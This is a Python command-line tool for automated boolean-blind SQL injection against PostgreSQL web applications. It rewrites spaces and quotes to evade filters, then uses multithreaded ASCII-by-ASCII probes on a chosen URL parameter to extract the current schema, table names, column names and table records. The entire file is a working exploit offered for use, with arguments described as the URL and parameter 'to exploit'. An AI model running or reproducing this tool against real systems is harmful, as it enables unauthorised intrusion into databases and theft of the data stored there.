import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Boolean-blind based PostgreSQL injection
# if 500 error, then the condition is false
# if 200 error, then the condition is true

TIMEOUT = 4
lock = threading.Lock()

def cleanup(s):
    return s.replace(' ', '/**/').replace('\'', '$$').replace('"', '$$')

def make_request(url, argument, sqli):
    sqli = cleanup(sqli)
    try:
        res = requests.get(f"{url}?{argument}={sqli}", timeout=TIMEOUT)
        return res.status_code == 200
    except requests.exceptions.Timeout:
        return False

def get_length(url, argument, query):
    print(f"Getting length of query: {query}")
    length = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(make_request, url, argument, f"(SELECT CASE WHEN (LENGTH(({query}))={i}) THEN 1 ELSE 1/(SELECT 0) END)"): i for i in range(1, 101)}
        for future in as_completed(futures):
            if future.result():
                length = futures[future]
                break
    print(f"Length found: {length}")
    return length

def get_count(url, argument, query):
    print(f"Getting count of query: {query}")
    count = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(make_request, url, argument, f"(SELECT CASE WHEN ((SELECT COUNT(*) FROM {query})={i}) THEN 1 ELSE 1/(SELECT 0) END)"): i for i in range(1, 101)}
        for future in as_completed(futures):
            if future.result():
                count = futures[future]
                break
    print(f"Count found: {count}")
    return count

def get_current_schema(url, argument):
    print("Getting current schema name...")
    length = get_length(url, argument, "(SELECT CURRENT_SCHEMA())")
    schema = ''
    for i in range(1, length + 1):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(make_request, url, argument, f"(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT CURRENT_SCHEMA()) FROM {i} FOR 1))={j}) THEN 1 ELSE 1/(SELECT 0) END)"): j for j in range(32, 127)}
            for future in as_completed(futures):
                if future.result():
                    schema += chr(futures[future])
                    break
    print(f'Current schema: {schema}')
    return schema

def get_tables(url, argument, schema):
    print(f"Getting tables from schema: {schema}")
    query = f"INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{schema}'"
    count = get_count(url, argument, query)
    print(f"Table count: {count}")
    tables = []
    for i in range(count):
        table = ''
        length = get_length(url, argument, f"(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{schema}' LIMIT 1 OFFSET {i})")
        for j in range(1, length + 1):
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {executor.submit(make_request, url, argument, f"(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{schema}' LIMIT 1 OFFSET {i}) FROM {j} FOR 1))={k}) THEN 1 ELSE 1/(SELECT 0) END)"): k for k in range(32, 127)}
                for future in as_completed(futures):
                    if future.result():
                        table += chr(futures[future])
                        break
        tables.append(table)
        print(f'Table: {table}')
    return tables

def dump_table(url, argument, schema, table):
    print(f"Dumping table: {table} from schema: {schema}")
    query = f"INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{schema}' AND TABLE_NAME='{table}'"
    count = get_count(url, argument, query)
    columns = []
    for i in range(count):
        column = ''
        length = get_length(url, argument, f"(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{schema}' AND TABLE_NAME='{table}' LIMIT 1 OFFSET {i})")
        for j in range(1, length + 1):
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {executor.submit(make_request, url, argument, f"(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{schema}' AND TABLE_NAME='{table}' LIMIT 1 OFFSET {i}) FROM {j} FOR 1))={k}) THEN 1 ELSE 1/(SELECT 0) END)"): k for k in range(32, 127)}
                for future in as_completed(futures):
                    if future.result():
                        column += chr(futures[future])
                        break
        columns.append(column)
        print(f'Column: {column}')

    for column in columns:
        for i in range(1, 101):
            record = ''
            length = get_length(url, argument, f"(SELECT {column} FROM {table} LIMIT 1 OFFSET {i-1})")
            for j in range(1, length + 1):
                with ThreadPoolExecutor(max_workers=10) as executor:
                    futures = {executor.submit(make_request, url, argument, f"(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1 OFFSET {i-1}) FROM {j} FOR 1))={k}) THEN 1 ELSE 1/(SELECT 0) END)"): k for k in range(32, 127)}
                    for future in as_completed(futures):
                        if future.result():
                            record += chr(futures[future])
                            break
            if record:
                print(f'Record: {record}')
            else:
                break

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='URL to exploit')
    parser.add_argument('argument', help='Argument to exploit')
    parser.add_argument('-d', '--database', help='The schema to dump tables from')
    parser.add_argument('-t', '--table', help='Table to dump')
    args = parser.parse_args()

    url = args.url
    argument = args.argument

    if args.table:
        schema = args.database if args.database else get_current_schema(url, argument)
        dump_table(url, argument, schema, args.table)
    elif args.database:
        get_tables(url, argument, args.database)
    else:
        current_schema = get_current_schema(url, argument)
        get_tables(url, argument, current_schema)
